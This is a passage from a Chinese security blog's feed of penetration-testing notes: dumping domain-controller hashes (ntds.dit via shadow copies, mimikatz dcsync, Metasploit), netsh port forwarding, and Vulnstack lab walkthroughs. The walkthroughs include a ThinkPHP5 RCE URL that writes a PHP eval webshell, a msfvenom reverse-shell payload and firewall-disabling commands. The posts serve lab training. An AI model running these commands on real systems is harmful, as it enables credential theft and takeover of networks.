src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171957880.png" alt="image-20240107171957880">删除卷影</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vssadmin delete shadows /for=c: /quiet<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172032840.png" alt="image-20240107172032840"></p><ul><li><strong>利用vssown.vbs脚本提取ntds.dit</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动卷影拷贝服务</span><br>cscript vssown.vbs /start<br><span class="hljs-comment">#创建一个c盘的卷影拷贝</span><br>cscript vssown.vbs /create c<br><span class="hljs-comment">#列出当前卷影拷贝</span><br>cscript vssown.vbs /list<br><span class="hljs-comment">#删除卷影拷贝</span><br>cscript vssown.vbs /delete &#123;GUID&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172041493.png" alt="image-20240107172041493"><br><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172108749.png" alt="image-20240107172108749"><br>然后可以通过copy命令将其复制出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit<br></code></pre></td></tr></table></figure><ul><li><strong>使用ntdsutil的IFM创建卷影拷贝</strong><br>在域控制器中以管理员模式打开命令行环境，输入如下命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil <span class="hljs-string">&quot;ac i ntds&quot;</span> <span class="hljs-string">&quot;ifm&quot;</span> <span class="hljs-string">&quot;create full c:/test&quot;</span> q q<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172139085.png" alt="image-20240107172139085"><br><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172146934.png" alt="image-20240107172146934">将其拖到本地后删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> /s/q <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172223341.png" alt="image-20240107172223341"></p><ul><li><strong>使用diskshadow导出ntds.dit</strong><br>在渗透测试中可以使用diskshadow.exe来执行命令。例如将需要执行的命令”exec c:\windows\system32\calc.exe”<br>写入C盘目录下的command.txt文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">diskshadow /s c:\command.txt<br></code></pre></td></tr></table></figure><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172232775.png" alt="image-20240107172232775"></li></ul><p>使用diskshadow.exe也可以用来导出ntds.dit。将如下命令写入一个文本文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> context persistent nowriters<br>add volume c: <span class="hljs-built_in">alias</span> someAlias<br>create<br>expose %someAlias% k:<br><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> /c copy k:\Windows\NTDS\ntds.dit c:\ntds.dit<br>delete shadows all<br>list shadows all<br>reset<br><span class="hljs-built_in">exit</span><br><br><br>diskshadow /s c:\Users\de1ay\Desktop\command.txt<br><br>reg save hklm\system c:\system.hive<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172240939.png" alt="image-20240107172240939"><br>成功导出</p><h2 id="导出ntds-dit中散列值"><a href="#导出ntds-dit中散列值" class="headerlink" title="导出ntds.dit中散列值"></a>导出ntds.dit中散列值</h2><ul><li><strong>使用esedbexport恢复ntds.dit</strong><br>1.导出ntds.dit<br>安装好该软件<br><a href="https://github.com/libyal/libesedb/releases/tag/20210424">https://github.com/libyal/libesedb/releases/tag/20210424</a><br>将文件拖入kali中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">esedbexport -m tables ntds.dit<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172252334.png" alt="image-20240107172252334"></p><p>2.导出散列值</p><p>ntdsxtract</p><ul><li><strong>使用impacket工具包导出散列值</strong></li></ul><p>impacket-secretsdump</p><ul><li><strong>在windows在解析ntds.dit</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\NTDSDumpEx.exe -d ntds.dit -s .\system.hive<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172307879.png" alt="image-20240107172307879"></p><h2 id="利用dcsync获取域散列值"><a href="#利用dcsync获取域散列值" class="headerlink" title="利用dcsync获取域散列值"></a>利用dcsync获取域散列值</h2><ul><li><strong>使用mimikatz转储域散列值</strong><br>以域管理员权限打开命令行环境，运行mimikatz。输入如下命令，使用mimikatz导出域内的所有用户及散列值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:de1ay.com /all /csv<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172430351.png" alt="image-20240107172430351"></p><p>使用mimikatz的dcsync功能也可以导出指定用户的散列值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:de1ay.com /user:de1ay<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172442051.png" alt="image-20240107172442051"><br>也可以直接在域控制器中运行Mimikatz，通过转储lsass.exe进程对散列值进行Dump操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>lsadump::lsa /inject<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172451207.png" alt="image-20240107172451207"></p><ul><li><strong>使用dcsync获取账号和域散列值</strong><br>Invoke-DCSync.ps1可以利用dcsync直接读取ntds.dit，以获取域账号和域散列值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-DCSync -PWDumpFormat<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172507284.png" alt="image-20240107172507284"></p><p>项目地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p><h2 id="使用msf获取域散列值"><a href="#使用msf获取域散列值" class="headerlink" title="使用msf获取域散列值"></a>使用msf获取域散列值</h2><ul><li><p><strong>psexec_ntdsgrad</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/psexec_ntdsgrad<br></code></pre></td></tr></table></figure><p>设置好参数后运行即可，会将ntds.dit和SYSTEM项复制并传送到&#x2F;root&#x2F;.msf4&#x2F;loot&#x2F;文件夹下<br>拿到两个文件后就可以用工具进行解密了</p></li><li><p><strong>基于msf会话获取域账号和散列值</strong><br>比如已经获取到一个会话了<br>然后使用</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use windows/gather/credentials/domain_hashdump<br></code></pre></td></tr></table></figure><p>就会导出域中的全部hash值</p><ul><li><strong>ms14-068漏洞</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172516032.png" alt="image-20240107172516032"></p><p>接下来进行格式转换,msf不支持bin文件导出，所以要用mimikatz文件进行格式转换.在mimikatz输入命令,导出kirbi格式文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::clist <span class="hljs-string">&quot;20210609221820_default_192.168.43.16_windows.kerberos_125881.bin&quot;</span> /export<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172524015.png" alt="image-20240107172524015"><br>比如现在有一个低权限shell<br><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107172531778.png" alt="image-20240107172531778"><br>输入 load kiwi 命令,然后输入”kerberos_ticket_use   &#x2F;root&#x2F;<a href="mailto:&#x30;&#x2d;&#x30;&#x30;&#48;&#48;&#48;&#x30;&#x30;&#x30;&#x2d;&#x64;&#x65;&#49;&#x61;&#121;&#64;&#x6b;&#x72;&#98;&#x74;&#x67;&#x74;&#45;&#x44;&#69;&#49;&#65;&#x59;&#46;&#67;&#x4f;&#77;&#46;&#x6b;&#x69;&#x72;&#x62;&#105;">&#x30;&#x2d;&#x30;&#x30;&#48;&#48;&#48;&#x30;&#x30;&#x30;&#x2d;&#x64;&#x65;&#49;&#x61;&#121;&#64;&#x6b;&#x72;&#98;&#x74;&#x67;&#x74;&#45;&#x44;&#69;&#49;&#65;&#x59;&#46;&#67;&#x4f;&#77;&#46;&#x6b;&#x69;&#x72;&#x62;&#105;</a>“命令，将票据导入，接着输入 background命令，切换到meterpreter后台,使用高票据进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/current_user_psexec<br><span class="hljs-built_in">set</span> technique psh<br><span class="hljs-built_in">set</span> rhosts DC.de1ay.com<br><span class="hljs-built_in">set</span> session 1<br></code></pre></td></tr></table></figure><p>就会得到高权限</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域控制器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openssl流量加密</title>
    <link href="/2022/06/15/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/"/>
    <url>/2022/06/15/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="e9daa28b3613553dabec42e234489f3133817b39e2471428bb99f2120e6f7feb"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>openssl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口转发</title>
    <link href="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h2 id="netsh的基本使用（需要有admin权限）"><a href="#netsh的基本使用（需要有admin权限）" class="headerlink" title="netsh的基本使用（需要有admin权限）"></a>netsh的基本使用（需要有admin权限）</h2><p>通过做端口映射访问内网主机<br><strong>做映射</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.101.107 <span class="hljs-attribute">listenport</span>=14941     <span class="hljs-attribute">connectaddress</span>=192.168.101.106 <span class="hljs-attribute">connectport</span>=1494<br></code></pre></td></tr></table></figure><p>其中listenaddress是我们监听的地址<br>listenport是监听端口<br>connectaddress 是连接地址</p><p>还可以这样写</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=14941 <span class="hljs-attribute">connectaddress</span>=192.168.101.106 <span class="hljs-attribute">connectport</span>=1494<br></code></pre></td></tr></table></figure><p><strong>使用下面命令进行查看端口</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">show</span> <span class="hljs-symbol">v4tov4</span><br></code></pre></td></tr></table></figure><p><strong>取消端口转发：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy delete v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.101.107 <span class="hljs-attribute">listenport</span>=14941<br></code></pre></td></tr></table></figure><p><strong>清除所有规则</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">reset</span><br></code></pre></td></tr></table></figure><h2 id="MSF利用netsh转发"><a href="#MSF利用netsh转发" class="headerlink" title="MSF利用netsh转发"></a>MSF利用netsh转发</h2><p><img src="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20240107154635767.png" alt="image-20240107154635767">在msf中生成木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=10.10.10.153 <span class="hljs-attribute">lport</span>=4455 -f exe &gt; one.exe  <br></code></pre></td></tr></table></figure><p>在A服务器上使用netsh做转发</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenport</span>=4455 <span class="hljs-attribute">connectaddress</span>=192.168.0.135 <span class="hljs-attribute">connectport</span>=4455<br></code></pre></td></tr></table></figure><p>在kali中设置监听</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use windows/multi/handler<br><span class="hljs-keyword">set</span> windows/meterpreter/reverse_tcp<br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.0.135</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4455</span><br></code></pre></td></tr></table></figure><h2 id="cobaltstrike利用netsh转发"><a href="#cobaltstrike利用netsh转发" class="headerlink" title="cobaltstrike利用netsh转发"></a>cobaltstrike利用netsh转发</h2><p><img src="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/image-20240107154644728.png" alt="image-20240107154644728"></p><h2 id="msf下的端口转发"><a href="#msf下的端口转发" class="headerlink" title="msf下的端口转发"></a>msf下的端口转发</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">portfwd</span>   add -l <span class="hljs-number">8080</span> r <span class="hljs-number">192.168.1.1</span> -p <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>将本地8080端口的请求转发到远端的80端口上</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>端口转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机五</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/</url>
    
    <content type="html"><![CDATA[<p>靶机下载地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a> win7（双网卡）： 192.168.1.18外网） 192.168.138.136（内网）</p><p>win2008:192.168.138.138</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155302451.png" alt="image-20240107155302451"></p><p>访问80看看，是TP5的站</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155311145.png" alt="image-20240107155311145"></p><p>关于tp5的漏洞利用方式请查看：<a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p><p>成功利用，并执行了命令</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155319436.png" alt="image-20240107155319436"></p><p>写入shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.1.18/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_POST[&quot;code&quot;]);?^&gt;&gt;shell.php</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155327337.png" alt="image-20240107155327337"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155338352.png" alt="image-20240107155338352"></p><p>上线C2</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155345635.png" alt="image-20240107155345635"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155353413.png" alt="image-20240107155353413"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155403691.png" alt="image-20240107155403691"></p><p>内网存活主机探测</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155411626.png" alt="image-20240107155411626"></p><p>查看域控</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155418963.png" alt="image-20240107155418963"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155428008.png" alt="image-20240107155428008"></p><p>现在已经是管理员权限了可以直接抓下密码看看</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155436964.png" alt="image-20240107155436964"></p><p>上链路进行横向</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155445862.png" alt="image-20240107155445862"></p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155454800.png" alt="image-20240107155454800"></p><p>生成载荷上传到目标机器</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155505130.png" alt="image-20240107155505130"></p><p>批量上线DC不成功</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155515875.png" alt="image-20240107155515875"></p><h3 id="因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙-NetSh-Advfirewall-set-allprofiles-state-off-，或者添加规则来放行5555端口"><a href="#因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙-NetSh-Advfirewall-set-allprofiles-state-off-，或者添加规则来放行5555端口" class="headerlink" title="**因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙:**NetSh Advfirewall set allprofiles state off ，或者添加规则来放行5555端口"></a>**因为win7的防火墙缘故，5555端口是进不去的可以，关闭防火墙:**<strong>NetSh Advfirewall set allprofiles state off</strong> <strong>，或者添加规则来放行5555端口</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">netsh advfirewall firewall add rule name=cs dir=<span class="hljs-keyword">in</span> action=allow protocol=<span class="hljs-variable constant_">TCP</span> localport=<span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155531308.png" alt="image-20240107155531308"></p><p>最后全部上线</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%94/index/image-20240107155538623.png" alt="image-20240107155538623"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机一</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/</url>
    
    <content type="html"><![CDATA[<p>拓朴图如下： </p><p>（win7为VM1（192.168.1.9、192.168.52.2），win2003为VM2（192.168.52.3，win2008为VM3（192.168.52.1））</p><p><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155602886.png" alt="image-20240107155602886"></p><p>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对web服务器进行端口扫描一波<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155612632.png" alt="image-20240107155612632">发现存在80和3306端口，访问80端口如下<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155621032.png" alt="image-20240107155621032">发现是phpstudy的一个探针，那么就有可能会有phpmyadmin的web管理界面，目录扫描一波<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155631862.png" alt="image-20240107155631862">发现确实存在，访问看看<br><img src="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/image-20240107155641332.png" alt="image-20240107155641332">随手一个root&#x2F;root就进去了，现在就是通过这玩意儿拿shell了<br>有兴趣的读者可以看看这篇关于phpmyadmin漏洞的总结文章：<a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label0_0">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label0_0</a><br>这里通过日志文件来进行拿shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 